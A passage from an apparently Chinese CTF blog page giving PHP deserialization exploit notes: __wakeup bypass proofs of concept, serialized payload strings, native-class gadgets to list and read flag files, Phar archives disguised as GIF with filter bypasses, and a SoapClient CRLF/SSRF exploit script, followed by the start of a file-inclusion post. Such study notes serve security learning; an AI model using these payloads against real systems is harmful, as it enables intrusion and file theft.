<li><strong>指针引用：</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;a1 =&amp; <span class="variable">$b</span>-&gt;a2;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>; <span class="comment">// $b 是 $a 的引用</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">20</span>;  <span class="comment">// 改变 $b 也会改变 $a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;  <span class="comment">// 输出 20</span></span><br></pre></td></tr></table></figure></li>
<li><strong>畸形字符串</strong> <ul>
<li><strong>绕过 <code>wakeup</code>。</strong></li>
</ul>
</li>
<li><strong>利用将属性值变大。</strong></li>
</ul>
<h1 id="使用-C-代替-O"><a href="#使用-C-代替-O" class="headerlink" title="使用 C 代替 O"></a>使用 C 代替 O</h1><h3 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h3><ul>
<li><code>5.3.0 - 5.3.29</code></li>
<li><code>5.4.0 - 5.4.45</code></li>
<li><code>5.5.0 - 5.5.38</code></li>
<li><code>5.6.0 - 5.6.40</code></li>
<li><code>7.0.0 - 7.0.33</code></li>
<li><code>7.1.0 - 7.1.33</code></li>
<li><code>7.2.0 - 7.2.34</code></li>
<li><code>7.3.0 - 7.3.28</code></li>
<li><code>7.4.0 - 7.4.16</code></li>
<li><code>8.0.0 - 8.0.3</code></li>
<li><strong>只能执行 <code>construct()</code> 函数，无法添加任何内容，然后析构函数最后执行。</strong></li>
</ul>
<h3 id="序列化机制构造一个对象，其中包含对象引用："><a href="#序列化机制构造一个对象，其中包含对象引用：" class="headerlink" title="序列化机制构造一个对象，其中包含对象引用："></a>序列化机制构造一个对象，其中包含对象引用：</h3><ul>
<li><code>7.0.0 - 7.0.14</code></li>
<li><code>7.1.0</code></li>
<li><code>5.4.14 - 5.4.45</code></li>
<li><code>5.5.0 - 5.5.38</code></li>
<li><code>5.6.0 - 5.6.29</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//https://3v4l.org/iLSA7</span></span><br><span class="line"><span class="comment">//https://bugs.php.net/bug.php?id=73367</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;ryat = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Not a serializable object&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;ryat == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;dtor!&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&#x27;O:3:&quot;obj&quot;:2:&#123;s:4:&quot;ryat&quot;;i:1;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;&#125;&#x27;</span>;<span class="comment">//构造一个对象，其中 ryat 被设置为 1，然后让对象的另一个属性通过引用指向 ryat __wakeup() 修改了 ryat，但由于引用的存在，这个修改在某些地方不起作用，从而在 __destruct() 中成功触发了你原本不希望被触发的代码。</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br></pre></td></tr></table></figure></li>
<li><strong>多写一个 <code>i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;</code> 再改对象数仿照以上。</strong></li>
</ul>
<h3 id="利用-fastdestruct-机制让-destruct-跑到前面去："><a href="#利用-fastdestruct-机制让-destruct-跑到前面去：" class="headerlink" title="利用 fastdestruct 机制让 destruct 跑到前面去："></a>利用 <code>fastdestruct</code> 机制让 <code>destruct</code> 跑到前面去：</h3><ul>
<li><strong>一般删最后的 <code>&#125;</code> 就行。</strong></li>
</ul>
<h1 id="字符-O-绕过"><a href="#字符-O-绕过" class="headerlink" title="字符 O 绕过"></a>字符 O 绕过</h1><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ul>
<li><code>&lt;7.1.33</code></li>
</ul>
<h3 id="测试脚本："><a href="#测试脚本：" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul>
<li><a target="_blank" rel="noopener" href="https://3v4l.org/YclXi">https://3v4l.org/YclXi</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//https://3v4l.org/YclXi</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:+1:&quot;C&quot;:0:&#123;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="字符-i、d-绕过"><a href="#字符-i、d-绕过" class="headerlink" title="字符 i、d 绕过"></a>字符 i、d 绕过</h1><h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h3><ul>
<li><code>&lt;8.0.3</code> （全版本）</li>
</ul>
<h3 id="测试脚本：-1"><a href="#测试脚本：-1" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul>
<li><a target="_blank" rel="noopener" href="https://3v4l.org/SJm2g">https://3v4l.org/SJm2g</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//https://3v4l.org/SJm2g</span></span><br><span class="line"><span class="comment">// echo serialize(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;i:-1;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;i:+1;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;d:-1.1;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;d:+1.2;&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="利用数组特性"><a href="#利用数组特性" class="headerlink" title="利用数组特性"></a>利用数组特性</h1><ul>
<li><p><strong>数组特性：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = [<span class="keyword">new</span> A, <span class="string">&#x27;a的方法&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span>(); <span class="comment">// 会直接调用 a 方法</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反序列化利用：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key)();     <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">在这里运用数组特性</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;mod2 =<span class="string">&quot;welcome&quot;</span>.<span class="variable language_">$this</span>-&gt;modl;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="variable">$arr</span> = [<span class="variable">$gf</span>, <span class="string">&#x27;get flag&#x27;</span>];</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> func;</span><br><span class="line">    <span class="variable">$f</span>-&gt;key = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="利用原生类"><a href="#利用原生类" class="headerlink" title="利用原生类"></a>利用原生类</h1><h3 id="查看-flag-文件名："><a href="#查看-flag-文件名：" class="headerlink" title="查看 flag 文件名："></a>查看 flag 文件名：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span> = <span class="string">&quot;glob:///f*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">c</span>(<span class="variable">$this</span>-&gt;f);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span> = <span class="string">&quot;/flllaaaaggg&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">c</span>(<span class="variable">$this</span>-&gt;f);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;FLAG&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="GMP"><a href="#GMP" class="headerlink" title="GMP"></a>GMP</h1><h1 id="Phar-八股文"><a href="#Phar-八股文" class="headerlink" title="Phar 八股文"></a>Phar 八股文</h1><ul>
<li><strong>这段代码展示了如何生成一个 <code>.phar</code> 文件，并将任意 PHP 代码作为 stub。当这个 <code>.phar</code> 文件被解析或执行时，代码中的 stub 会被执行。</strong></li>
<li><strong>如果 WAF 过滤了 <code>phar://</code>，则可以使用：</strong><ul>
<li><code>compress.bzip2://phar://</code></li>
<li><code>compress.zlib://</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//echo ($o) 变为八股文 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;text&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//执行生成 phar.phar 文件</span></span><br><span class="line">@<span class="title function_ invoke__">system</span>(<span class="string">&quot;gzip phar.phar&quot;</span>);  <span class="comment">// 将 Phar 文件压缩为 gzip 格式</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phar.phar.gz&quot;</span>));  <span class="comment">// 输出压缩后的 Phar 文件内容并进行 URL 编码，根据情况删掉后两行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="伪造为-GIF-的-Phar"><a href="#伪造为-GIF-的-Phar" class="headerlink" title="伪造为 GIF 的 Phar"></a>伪造为 GIF 的 Phar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置 stub，增加 gif 文件头</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义 meta-data 存入 manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="然后就是利用，可以利用的函数："><a href="#然后就是利用，可以利用的函数：" class="headerlink" title="然后就是利用，可以利用的函数："></a>然后就是利用，可以利用的函数：</h3><ul>
<li><code>file_get_contents</code></li>
<li><code>fileatime</code></li>
<li><code>filectime</code></li>
<li><code>file_ctime</code></li>
<li><code>is_dir</code></li>
<li><code>is_file</code></li>
<li><code>is_executable</code></li>
<li><code>copy</code></li>
<li><code>unlink</code></li>
<li><code>stat</code></li>
<li><code>readfile</code></li>
</ul>
<h3 id="利用-file-get-contents-可以访问自己网站上的-Phar："><a href="#利用-file-get-contents-可以访问自己网站上的-Phar：" class="headerlink" title="利用 file_get_contents 可以访问自己网站上的 Phar："></a>利用 <code>file_get_contents</code> 可以访问自己网站上的 Phar：</h3><ul>
<li><code>cd /var/www/html</code></li>
<li><code>sudo chown www-data:www-data /var/www/html -R</code></li>
<li><code>sudo nano writefile.php</code></li>
</ul>
<h3 id="或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content"><a href="#或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content" class="headerlink" title="或者得到的数据直接上传到任意路径中，再用 phar://xxxxx 传到 file_get_content"></a>或者得到的数据直接上传到任意路径中，再用 <code>phar://xxxxx</code> 传到 <code>file_get_content</code></h3><h3 id="利用-data-在-PHP-终端制造："><a href="#利用-data-在-PHP-终端制造：" class="headerlink" title="利用 data:// 在 PHP 终端制造："></a>利用 <code>data://</code> 在 PHP 终端制造：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ph</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ph</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>让 <code>file_get_contents</code> 包含 <code>&#123;data://text/plain;base64（写入终端结果）&#125;</code> 到 <code>xxx.html</code>（后缀不重要），最后让 <code>file_get_contents</code> 包含 <code>phar://xxx.html</code>。</strong></li>
</ul>
<hr>
<h1 id="总结一下利用-PHP-反序列化逃逸的步骤"><a href="#总结一下利用-PHP-反序列化逃逸的步骤" class="headerlink" title="总结一下利用 PHP 反序列化逃逸的步骤"></a>总结一下利用 PHP 反序列化逃逸的步骤</h1><ol>
<li>确定利用目标</li>
<li>按照原程序正常序列化的步骤做一遍，看看正常序列化字符串的结构，基于此考虑攻击方式。注意，键值对设置的顺序会影响序列化结果，一定要按照程序内的方式设置值。</li>
<li>计算逃逸总共需要的字符，考虑需要构建多少被替换的字符。</li>
<li>插入 payload，结合本地运行结果查看 payload 是否成功</li>
</ol>
<h3 id="PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"><a href="#PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。" class="headerlink" title="PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"></a>PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。</h3><hr>
<h1 id="CRLF-攻击"><a href="#CRLF-攻击" class="headerlink" title="CRLF 攻击"></a>CRLF 攻击</h1><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul>
<li>源码需要进行反序列化</li>
<li>源码调用一个方法，且该方法不存在。以此激活 <code>__call()</code></li>
</ul>
<h3 id="利用范围（PHP-5-PHP-7）："><a href="#利用范围（PHP-5-PHP-7）：" class="headerlink" title="利用范围（PHP 5, PHP 7）："></a>利用范围（PHP 5, PHP 7）：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VulnerableClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$userAgent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$userAgent</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userAgent = <span class="variable">$userAgent</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 输出一条消息，模拟 __call 魔术方法被触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Method <span class="subst">$name</span> was called!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserAgent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;userAgent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟用户输入反序列化的操作</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getUserAgent</span>();</span><br><span class="line">    <span class="comment">// 调用一个不存在的方法，激活 __call 方法</span></span><br><span class="line">    <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://xxx.xxx.xxx.xxx:5555/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aa</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aa</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm0kx5k5c000go8dkcr1og66r" data-title="反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-文件操作篇" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T09:03:21.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/">文件操作篇</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul>
<li><code>include()</code> 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。</li>
<li><code>include_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li>
<li><code>require()</code> 找不到被包含的文件时会产生致命错误，并停止脚本运行。</li>
<li><code>require_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li>
<li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。若文件内容不符合 PHP 语法规范则会暴露其源码。</li>
</ul>
<h1 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h1><ul>
<li><code>.</code>（单个点）：表示当前目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>./phpinfo.txt</code> 就表示 <code>/var/www/html/phpinfo.txt</code>。</li>
<li><code>..</code>（两个点）：表示上一级目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>../phpinfo.txt</code> 就表示 <code>/var/www/phpinfo.txt</code>。</li>
<li>如果是 PHP 文件 flag 最好用 base 读，txt 直接包含就行。</li>
</ul>
<h1 id="伪协议操作"><a href="#伪协议操作" class="headerlink" title="伪协议操作"></a>伪协议操作</h1><h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><ul>
<li>条件：<ul>
<li><code>allow_url_fopen</code>：不受影响</li>
<li><code>allow_url_include</code>：不受影响</li>
</ul>
</li>
<li>作用：用于访问本地文件系统。</li>
<li>说明：<ul>
<li><code>file://</code> 是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以 &#x2F;、\、\ 或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</li>
<li>在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code> 会可选地搜索，也作为相对的路径。</li>
</ul>
</li>
<li>示例：<ul>
